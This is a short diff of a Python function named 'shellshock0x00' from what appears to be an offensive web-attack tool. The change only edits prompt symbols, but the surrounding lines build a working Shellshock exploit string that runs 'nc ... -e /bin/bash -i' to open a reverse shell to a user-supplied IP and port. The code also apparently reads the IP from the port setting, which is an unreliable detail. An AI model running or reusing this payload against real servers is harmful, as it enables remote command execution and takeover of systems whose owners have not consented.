@@ -53,11 +53,11 @@ def shellshock0x00(web):
                 time.sleep(0.4)
                 print(GR+' [*] Configuring payload...')
                 if properties["SHELL-IP"][1] == " ":
-                    ip = input(C+' [§] Enter reverse IP :> ')
+                    ip = input(C+' [$] Enter reverse IP :> ')
                 else:
                     ip = properties["SHELL-PORT"][1]
                 if properties["SHELL-IP"][1] == " ":
-                    port = input(' [§] Enter port :> ')
+                    port = input(' [$] Enter port :> ')
                 else:
                     port = properties["SHELL-PORT"][1]
                 exp = '() { :; }; /bin/bash -c "nc -v '+str(ip)+' '+str(port)+' -e /bin/bash -i"'
